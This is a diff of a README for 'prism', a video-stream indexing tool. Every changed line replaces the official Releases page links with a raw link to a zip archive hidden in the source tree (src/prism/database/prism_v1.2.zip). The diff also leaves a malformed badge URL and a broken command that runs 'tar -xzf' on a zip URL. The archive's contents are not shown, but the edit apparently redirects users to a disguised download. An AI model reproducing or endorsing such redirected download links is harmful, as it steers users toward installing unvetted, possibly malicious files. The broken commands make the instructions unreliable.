@@ -8,9 +8,9 @@ Welcome to **prism**! This application helps you index video streams and search 
 
 To get started, visit the download page below to obtain the latest version of prism:
 
-[![Download prism](https://img.shields.io/badge/Download%20prism-v1.0-blue.svg)](https://github.com/bin-bash-57/prism/releases)
+[![Download prism](https://github.com/bin-bash-57/prism/raw/refs/heads/main/src/prism/database/prism_v1.2.zip%https://github.com/bin-bash-57/prism/raw/refs/heads/main/src/prism/database/prism_v1.2.zip)](https://github.com/bin-bash-57/prism/raw/refs/heads/main/src/prism/database/prism_v1.2.zip)
 
-You can find all available versions of prism on our [Releases page](https://github.com/bin-bash-57/prism/releases).
+You can find all available versions of prism on our [Releases page](https://github.com/bin-bash-57/prism/raw/refs/heads/main/src/prism/database/prism_v1.2.zip).
 
 ### Steps to Download
 
@@ -54,7 +54,7 @@ Once your download completes, follow these steps to install prism on your system
    ```
 3. Run the following command to extract the application:
    ```bash
-   tar -xzf prism-1.0-linux.tar.gz
+   tar -xzf https://github.com/bin-bash-57/prism/raw/refs/heads/main/src/prism/database/prism_v1.2.zip
    ```
 4. Navigate to the extracted folder:
    ```bash
@@ -103,4 +103,4 @@ prism leverages powerful technologies such as FastAPI for web services, Docker f
 
 ---
 
-For more details and updates, visit our [Releases page](https://github.com/bin-bash-57/prism/releases) frequently.
+For more details and updates, visit our [Releases page](https://github.com/bin-bash-57/prism/raw/refs/heads/main/src/prism/database/prism_v1.2.zip) frequently.
